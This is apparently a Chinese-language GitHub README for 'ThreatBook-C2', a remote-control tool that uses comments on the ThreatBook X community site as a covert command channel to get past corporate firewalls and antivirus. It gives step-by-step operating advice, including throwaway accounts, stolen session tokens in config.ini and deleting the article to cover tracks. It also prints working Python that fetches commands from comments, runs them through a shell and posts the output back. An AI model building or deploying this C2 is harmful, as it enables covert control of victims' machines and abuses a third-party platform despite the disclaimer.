<h1 align="center">ThreatBook-C2</h1>
<h2 align="center">利用微步社区做天然白名单且免杀的远控C2（支持手机电脑）</h2>

**郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，<u>任何人不得将其用于非法用途以及盈利等目的，否则后果自负</u>** 
<p align="center">
<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-_red.svg"></a>
<a href="https://github.com/yuziiiiiiiiii/ThreatBook-C2"><img  src="https://goreportcard.com/badge/github.com/projectdiscovery/httpx"></a>
</p>
<p align="center"><a href="#前言">前言</a> · <a href="#演示">演示</a> · <a href="#流量分析">流量分析</a> · <a href="#实操运用">实操运用</a>· <a href="#关键实现">关键实现</a></p>

---

## 前言

微步的X情报社区具有信息分享、传播及获取的功能，用户发表的信息是公开的信息，其他第三方均可以通过X情报社区获取用户发表的信息。在众多的攻防演练中常用于溯源，分析恶意IP，恶意附件等，殊不知也可以利用其天然白名单且免杀的优势做C2远控，防不胜防！如今许多企业网络设置了上网行为管理，网关等各种千奇百怪的安全设备，网络只对特定IP或域名设置白名单开放，然后限制一切陌生流量，这样则会导致即使对C2做了**云函数，CDN，域前置，IPv6**等各种技术实现了隐匿但是流动不起来，无法上线，此时则需要一个天然白名单做C2，不仅隐匿性杠杠滴，还无视各种安全设备，从而直接远控！

附上微步情报社区：https://x.threatbook.com/

## 演示

**桌面端**

![1](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/d51f8c28-843d-421a-b6f2-25f71d1cf68a)

**移动端**

![13345061142777462](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/34787d5c-bd1a-452e-941f-677bd76c5982)

## 流量分析

![1](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/74c5379e-eba4-4c84-a581-a1b5799a1f33)

根据流量包，可以看出和C2的通讯IP为117.50.19.28是微步社区的IP，企业内为默认白名单IP，因此IP上不仅做到了隐匿也做到了与企业间可通信。流量走https加密流量，命令间存在心跳时间

![2](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/3d12454d-b247-4c4f-a18b-9e5b4e8c0ff2)

## 实操运用

- **一个微步社区正常的账号（可以创建干净的小号，进一步增强隐匿性）**

- **发布一篇微步社区文章（建议提前几天准备好，临时发布的文章曝光度高，容易被其他人看见），建议提前将命令输入评论区（命令格式是"命令+真正的命令"），避免踩空**

  ![7](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/e6fd4790-cc1b-471a-9667-27ec351eadd5)

- **记录下关键信息**

微步社区的文章ID

![3](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/4cd1815c-3505-49d6-a725-1e55b3aa1e87)

微步社区的验证字段

csrfToken

rememberme

xx-csrf

![4](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/5a2de377-ec44-434a-9107-730c02a59880)

将关键信息填入config.ini中

![5](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/f8858b6b-0b38-4e45-a3df-dcf862103fba)

同目录下运行C2.exe（目测无视一切杀软执行命令且回显），这时候回到微步社区文章页面进行刷新，会发现命令已经回显

![6](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/5b7a49a1-23c7-4230-9dce-6568a1dcdb26)

若需要再次执行命令只需要在评论区按格式输入命令，等待心跳时间后，即可以获取下一个命令回显（默认设置的是5s心跳时间）

结束远控后，及时保留关键信息并且将文章删除即可

![8](https://github.com/yuziiiiiiiiii/ThreatBook-C2/assets/138445912/90e5cb04-3b9c-4940-8bd7-ab6fd6b3a1d0)

## 关键实现
​	
​	此基于微步社区的远控，主要实现上利用了三个核心代码，分别为获取命令、回显命令、执行命令，以下我们来逐一解析

- 获取命令

```
def get_comments(short_message_id):
    base_url = "https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId="+short_message_id
    try:
    	#模拟用户发包
        response = requests.get(base_url)
        # 直接使用 response.json() 获取对象
        json_object = response.json()
        # 定义一个评论列表
        comments_list = json_object["data"]["list"]
        # 提取第一个 comments 对应的值
        first_comment = comments_list[0]["comments"]
        # 返回第一个 comments 对应的值
        return first_comment
        # 错误性判断
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
```

- 回显命令

```
def send_comment(comment, short_message_id, csrf_token, rememberme, xx_csrf):
    url = "https://x.threatbook.com/v5/node/user/article/saveComment"
	#请求头
    headers = {
        "Host": "x.threatbook.com",
        "Cookie": f"csrfToken={csrf_token}; rememberme={rememberme}; xx-csrf={xx_csrf}",
        "Content-Type": "application/json",
        "X-Csrf-Token": csrf_token,
        "Xx-Csrf": xx_csrf,
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
	#请求体
    data = {
        "comment": comment,
        "isAnonymous": "False",
        "targetId": "0",
        "shortMeaasgeId": short_message_id
    }
	#回显命令
    try:
        response = requests.post(url, json=data, headers=headers)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
```

- 执行命令

```
  def command(cmd):
	#Popen()函数使用shell执行命令，stdout和stderr是子进程的标准输出和标准错误输出
    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    #启动并等待子进程完成，通过stdout和stderr读取子进程的输出
    stdout, stderr = process.communicate()
    #返回标准输出并解码为gbk编码的字符串
    return stdout.decode('gbk')
```
